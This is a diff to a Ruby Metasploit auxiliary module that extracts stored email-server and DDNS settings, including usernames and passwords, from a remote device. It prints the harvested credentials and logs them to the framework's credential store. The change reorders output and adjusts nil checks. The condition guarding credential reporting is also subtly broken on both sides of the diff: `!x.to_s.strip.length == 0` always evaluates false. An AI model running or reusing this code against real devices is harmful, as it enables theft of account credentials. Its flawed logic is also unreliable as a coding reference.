@@ -101,8 +101,8 @@ class Metasploit3 < Msf::Auxiliary
       print_status("Email Settings: @ #{rhost}:#{rport}!")
       if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
         if mailhost = Regexp.last_match[1].split(':')
-          print_status("  Server Port: #{mailhost[1]}")
           print_status("  Server: #{mailhost[0]}") unless mailhost[0].nil?
+          print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
           print_status("  Destination Email: #{data[1]}") unless mailhost[1].nil?
         end
           if !data[5].nil? && !data[6].nil?
@@ -112,9 +112,8 @@ class Metasploit3 < Msf::Auxiliary
             mpass = "#{data[6]}"
             mailserver = "#{mailhost[0]}"
             mailport = "#{mailhost[1]}"
-            print_good("MailServer: #{mailserver}")
-            if !mailserver.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
-              report_email_creds(mailserver, mailport, muser, mpass) if !mailserver.nil? && !muser.nil? && !mpass.nil?
+            if !mailserver.to_s.strip.length == 0 && !mailport.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
+              report_email_creds(mailserver, mailport, muser, mpass) if !mailserver.nil? && !mailport.nil? && !muser.nil? && !mpass.nil?
             end
           end
       end
@@ -136,12 +135,12 @@ class Metasploit3 < Msf::Auxiliary
           ddns_user = "#{val[4]}"
           ddns_pass = "#{val[5]}"
           print_status("DDNS Settings @ #{rhost}:#{rport}!:")
-          print_status("  DDNS Service: #{ddns_service}") unless val.nil?
-          print_status("  DDNS Server:  #{ddns_server}") unless val.nil?
-          print_status("  DDNS Port: #{ddns_port}") unless val.nil?
-          print_status("  Domain: #{ddns_domain}") unless val.nil?
-          print_good("  Username: #{ddns_user}") unless val.nil?
-          print_good("  Password: #{ddns_pass}") unless val.nil?
+          print_status("  DDNS Service: #{ddns_service}")
+          print_status("  DDNS Server:  #{ddns_server}")
+          print_status("  DDNS Port: #{ddns_port}")
+          print_status("  Domain: #{ddns_domain}")
+          print_good("  Username: #{ddns_user}")
+          print_good("  Password: #{ddns_pass}")
           if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
             report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
           end
